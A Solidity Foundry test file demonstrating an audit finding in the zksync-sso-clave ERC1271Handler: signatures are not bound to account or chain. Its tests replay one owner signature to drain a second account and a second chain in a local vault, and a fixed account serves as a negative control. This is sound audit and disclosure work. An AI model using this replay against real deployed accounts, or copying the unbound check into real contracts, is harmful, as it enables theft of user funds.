// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";

// REAL audited source (zksync-sso-clave-contracts @ ed21d09), byte-identical.
// The vulnerable function is ERC1271Handler.isValidSignature (src/handlers/ERC1271Handler.sol L25).
import { ERC1271Handler } from "../src/handlers/ERC1271Handler.sol";
import { ECDSA } from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import { IERC1271Upgradeable } from "@openzeppelin/contracts-upgradeable/interfaces/IERC1271Upgradeable.sol";

/// @dev Concrete deployable instance of the REAL, unmodified `ERC1271Handler`
/// (which pulls in the real `OwnerManager` owner set + `ValidatorManager`).
/// `initOwner` mirrors the real `SsoAccount.initialize`, which itself calls
/// `_addK1Owner(initialK1Owners[i])` — no protocol logic is mocked or altered.
/// The audited replay bug lives in the inherited `isValidSignature`, untouched.
contract TestSsoAccount is ERC1271Handler {
  function initOwner(address owner) external {
    _addK1Owner(owner); // real OwnerManager path
  }
}

/// @dev Minimal REAL ERC-1271 consumer (the victim integration). It represents any
/// dApp/protocol that authorizes a value movement from an account's balance by
/// checking the account's EIP-1271 signature over an order. It keeps its OWN
/// per-account replay guard (`usedOrder`) — the standard thing a careful
/// integrator does — and relies on the smart account to bind the signature to
/// (account, chain) as ERC-1271 best practice / ERC-7739 requires. This is NOT the
/// vulnerable contract; it is the boundary where the missing binding causes loss.
contract SignatureGatedVault {
  bytes4 internal constant MAGIC = 0x1626ba7e;
  mapping(address => uint256) public balanceOf; // ETH credited to each account
  mapping(bytes32 => bool) public usedOrder;     // (account, orderHash) -> used

  function deposit(address account) external payable {
    balanceOf[account] += msg.value;
  }

  function orderHashOf(address to, uint256 amount, uint256 nonce) public pure returns (bytes32) {
    // NOTE: the order binds (to, amount, nonce) but NOT the paying account — the
    // integrator (reasonably) expects the account's isValidSignature to bind that.
    return keccak256(abi.encode(to, amount, nonce));
  }

  function withdraw(address account, address to, uint256 amount, uint256 nonce, bytes calldata signature) external {
    bytes32 orderHash = orderHashOf(to, amount, nonce);
    bytes32 key = keccak256(abi.encode(account, orderHash));
    require(!usedOrder[key], "vault: order already used on this account");
    require(IERC1271Upgradeable(account).isValidSignature(orderHash, signature) == MAGIC, "vault: bad sig");
    usedOrder[key] = true;
    balanceOf[account] -= amount;
    (bool ok, ) = to.call{ value: amount }("");
    require(ok, "vault: transfer failed");
  }
}

/// @dev NEGATIVE CONTROL ONLY — a corrected account applying the finding's fix
/// (ERC-7739-style defensive rehashing: bind chainid + address(this) into the
/// signed digest). NOT audited source. Used solely to prove the replay is caused
/// by the MISSING binding, not by the test setup.
contract FixedSsoAccount {
  bytes4 internal constant MAGIC = 0x1626ba7e;
  mapping(address => bool) public isOwner;

  function initOwner(address owner) external {
    isOwner[owner] = true;
  }

  /// @dev The bound digest the owner must sign for THIS account on THIS chain.
  function boundDigest(bytes32 hash) public view returns (bytes32) {
    return keccak256(abi.encode(block.chainid, address(this), hash));
  }

  function isValidSignature(bytes32 hash, bytes memory signature) external view returns (bytes4) {
    (address signer, ECDSA.RecoverError err) = ECDSA.tryRecover(boundDigest(hash), signature);
    if (signer == address(0) || err != ECDSA.RecoverError.NoError || !isOwner[signer]) return bytes4(0);
    return MAGIC;
  }
}

contract SignatureReplay_56710_Test is Test {
  bytes4 internal constant MAGIC = 0x1626ba7e;

  uint256 internal ownerKey = 0xA11CE;           // EOA that owns MULTIPLE SSO accounts
  address internal owner;                          // = vm.addr(ownerKey)
  address internal attacker = address(0x1111111111111111111111111111111111111111);

  TestSsoAccount internal accountA; // victim account A (owner = `owner`)
  TestSsoAccount internal accountB; // victim account B (SAME owner)
  SignatureGatedVault internal vault;

  function setUp() public {
    vm.deal(address(this), 1_000_000 ether);
    owner = vm.addr(ownerKey);
    accountA = new TestSsoAccount();
    accountB = new TestSsoAccount();
    accountA.initOwner(owner);
    accountB.initOwner(owner);
    vault = new SignatureGatedVault();
  }

  // ─────────────────────────────────────────────────────────────────────────
  // PRIMARY HARM: one owner signature, meant for account A, is REPLAYED against
  // a second account B owned by the same EOA — draining B's funds. Account B's
  // owner never scoped any authorization to B.
  // ─────────────────────────────────────────────────────────────────────────
  function test_CrossAccountReplay_DrainsSecondAccount() public {
    // Both accounts have 1 ETH credited in the vault.
    vault.deposit{ value: 1 ether }(address(accountA));
    vault.deposit{ value: 1 ether }(address(accountB));
    assertEq(vault.balanceOf(address(accountA)), 1 ether);
    assertEq(vault.balanceOf(address(accountB)), 1 ether);

    // Owner signs ONE order: "pay 1 ETH to `attacker`, nonce 0". The order does not
    // reference any specific account (the account is supposed to bind that).
    bytes32 orderHash = vault.orderHashOf(attacker, 1 ether, 0);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerKey, orderHash);
    bytes memory sig = abi.encodePacked(r, s, v);
    assertEq(sig.length, 65);

    // Sanity: this is a genuinely valid EIP-1271 signature for BOTH accounts,
    // because the handler only recovers the signer and checks _isK1Owner — no
    // account/chain binding.
    assertEq(accountA.isValidSignature(orderHash, sig), MAGIC, "A must accept (intended)");
    assertEq(accountB.isValidSignature(orderHash, sig), MAGIC, "B accepts the SAME sig (replay)");

    uint256 attackerBefore = attacker.balance;

    // (1) Authorized settlement from account A.
    vault.withdraw(address(accountA), attacker, 1 ether, 0, sig);

    // (2) REPLAY the identical signature against account B. The vault's own
    // per-account guard does not stop it (different account key), and account B
    // validates it because it shares the owner and performs no binding.
    vault.withdraw(address(accountB), attacker, 1 ether, 0, sig);

    // HARM: account B drained by a signature the owner only ever produced once,
    // for a payment not scoped to B. Attacker received 2 ETH for 1 authorization.
    assertEq(vault.balanceOf(address(accountA)), 0, "A settled (intended)");
    assertEq(vault.balanceOf(address(accountB)), 0, "B DRAINED via replay (unauthorized)");
    assertEq(attacker.balance - attackerBefore, 2 ether, "attacker doubled the payout");

    // Emit the exact constants the cheatcode-free Playground synthetic replays.
    console2.log("owner        :", owner);
    console2.log("attacker     :", attacker);
    console2.logBytes32(orderHash);
    console2.logBytes(sig);
  }

  // ─────────────────────────────────────────────────────────────────────────
  // SECONDARY: the EIP-712 domain (chain id + verifying contract) removal means
  // the SAME signature is valid across chains. Same account address on chain 1
  // and chain 137 accepts the identical signature (no chainid binding).
  // ─────────────────────────────────────────────────────────────────────────
  function test_CrossChainReplay_SameAccount() public {
    bytes32 orderHash = vault.orderHashOf(attacker, 1 ether, 0);

    vm.chainId(1);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerKey, orderHash);
    bytes memory sig = abi.encodePacked(r, s, v);
    assertEq(accountA.isValidSignature(orderHash, sig), MAGIC, "valid on chain 1 (intended)");

    // Same deterministic account address on another chain: identical signature.
    vm.chainId(137);
    assertEq(accountA.isValidSignature(orderHash, sig), MAGIC, "REPLAY valid on chain 137 too");

    // Drain the account's chain-137 balance with the chain-1 signature.
    vault.deposit{ value: 1 ether }(address(accountA));
    uint256 attackerBefore = attacker.balance;
    vault.withdraw(address(accountA), attacker, 1 ether, 0, sig);
    assertEq(vault.balanceOf(address(accountA)), 0, "chain-137 balance drained by chain-1 sig");
    assertEq(attacker.balance - attackerBefore, 1 ether);
  }

  // ─────────────────────────────────────────────────────────────────────────
  // NEGATIVE CONTROL: with the finding's fix (bind chainid + address(this)), the
  // replay against a second account FAILS — proving the missing binding is the
  // root cause, not the test setup.
  // ─────────────────────────────────────────────────────────────────────────
  function test_Fix_BindsAccountAndChain_RejectsReplay() public {
    FixedSsoAccount fixedA = new FixedSsoAccount();
    FixedSsoAccount fixedB = new FixedSsoAccount();
    fixedA.initOwner(owner);
    fixedB.initOwner(owner);

    bytes32 orderHash = vault.orderHashOf(attacker, 1 ether, 0);

    // Owner signs the bound digest for account A specifically.
    bytes32 boundA = fixedA.boundDigest(orderHash);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerKey, boundA);
    bytes memory sig = abi.encodePacked(r, s, v);

    // A accepts (correct binding); B rejects the same signature (different binding).
    assertEq(fixedA.isValidSignature(orderHash, sig), MAGIC, "fixed A accepts intended sig");
    assertEq(fixedB.isValidSignature(orderHash, sig), bytes4(0), "fixed B REJECTS the replay");

    // The vault-level replay now reverts on the fixed second account.
    vault.deposit{ value: 1 ether }(address(fixedB));
    vm.expectRevert(bytes("vault: bad sig"));
    vault.withdraw(address(fixedB), attacker, 1 ether, 0, sig);
  }

  // ─────────────────────────────────────────────────────────────────────────
  // FUZZ VARIANT (Thorough): for any recipient/amount/nonce, a single owner
  // signature authorized for account A always replays to drain account B.
  // ─────────────────────────────────────────────────────────────────────────
  function testFuzz_CrossAccountReplay(address to, uint96 rawAmount, uint256 nonce) public {
    vm.assume(to != address(0) && to != address(vault) && to.code.length == 0);
    vm.assume(uint160(to) > 0x10); // avoid precompiles as call targets
    uint256 amount = bound(uint256(rawAmount), 1, 100 ether); // fundable by the test rig

    vault.deposit{ value: amount }(address(accountA));
    vault.deposit{ value: amount }(address(accountB));

    bytes32 orderHash = vault.orderHashOf(to, amount, nonce);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerKey, orderHash);
    bytes memory sig = abi.encodePacked(r, s, v);

    vault.withdraw(address(accountA), to, amount, nonce, sig); // authorized
    vault.withdraw(address(accountB), to, amount, nonce, sig); // replay
    assertEq(vault.balanceOf(address(accountB)), 0, "B always drained by replay");
  }
}
